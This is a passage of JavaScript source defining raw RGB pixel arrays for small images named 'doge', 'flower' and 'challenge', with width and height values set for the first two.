81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 253, 7, 255, 253, 7, 76, 81, 81, 255, 253, 7, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 227, 225, 6, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
    255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255
];
doge.width = 20;
doge.height = 19;
var flower = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 158, 39, 255, 158, 39, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 158, 39, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 0, 0, 0, 255, 255, 255, 0, 0, 0, 195, 120, 29, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 158, 39, 255, 158, 39, 0, 0, 0, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 0, 0, 0, 255, 158, 39, 255, 158, 39, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 195, 120, 29, 0, 0, 0, 0, 0, 0, 255, 158, 39, 255, 158, 39, 255, 158, 39, 0, 0, 0, 0, 0, 0, 255, 158, 39, 255, 158, 39, 255, 158, 39, 0, 0, 0, 0, 0, 0, 255, 158, 39, 255, 158, 39, 255, 158, 39, 195, 120, 29, 0, 0, 0, 0, 0, 0, 255, 158, 39, 255, 158, 39, 0, 0, 0, 255, 158, 39, 255, 158, 39, 0, 0, 0, 255, 158, 39, 0, 0, 0, 255, 158, 39, 255, 158, 39, 0, 0, 0, 255, 158, 39, 255, 158, 39, 195, 120, 29, 0, 0, 0, 0, 0, 0, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 195, 120, 29, 195, 120, 29, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 195, 120, 29, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 195, 120, 29, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 255, 158, 39, 195, 120, 29, 195, 120, 29, 195, 120, 29, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 195, 120, 29, 195, 120, 29, 195, 120, 29, 195, 120, 29, 195, 120, 29, 195, 120, 29, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 255, 0, 39, 163, 32, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 39, 163, 32, 0, 0, 0, 0, 0, 0, 0, 255, 0, 39, 163, 32, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 39, 163, 32, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 39, 163, 32, 39, 163, 32, 39, 163, 32, 0, 0, 0, 39, 163, 32, 39, 163, 32, 0, 0, 0, 0, 255, 0, 0, 255, 0, 39, 163, 32, 39, 163, 32, 39, 163, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
flower.width = 16;
flower.height = 16;
var challenge = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 